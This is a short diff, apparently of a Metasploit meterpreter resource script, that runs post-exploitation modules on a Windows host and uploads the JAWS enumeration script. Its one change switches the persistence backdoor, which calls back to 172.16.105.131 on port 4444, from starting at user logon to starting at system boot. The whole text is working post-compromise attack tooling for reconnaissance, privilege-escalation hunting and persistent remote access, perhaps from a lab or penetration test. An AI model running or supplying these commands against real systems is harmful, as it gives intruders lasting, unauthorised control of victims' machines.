@@ -10,4 +10,4 @@ run post/windows/gather/enum_patches
 run post/multi/recon/local_exploit_suggester
 run post/windows/gather/checkvm
 upload /opt/JAWS/jaws-enum.ps1
-run persistence -A -U -p 4444 -r 172.16.105.131
+run persistence -A -X -p 4444 -r 172.16.105.131
